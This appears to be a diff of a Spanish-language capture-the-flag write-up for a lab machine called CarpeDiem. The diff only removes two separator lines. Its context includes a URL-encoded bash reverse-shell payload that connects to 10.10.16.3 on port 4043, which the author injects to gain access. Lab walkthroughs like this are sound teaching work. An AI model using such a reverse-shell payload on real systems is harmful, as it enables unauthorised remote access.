@@ -1,4 +1,3 @@
-_____________
 
 CarpeDiem es una máquina Linux de dificultad Hard que combina múltiples vectores 
 de ataque encadenados. Comenzamos enumerando subdominios para descubrir un portal 
@@ -95,7 +94,6 @@ Simplemente inyectamos el siguiente **payload** y nos metemos dentro de la máqu
 ```bash
 bash -c "bash -i >%26 /dev/tcp/10.10.16.3/4043 0>%261"
 ```
-___________
 
 ## DENTRO DE LA MÁQUINA
 
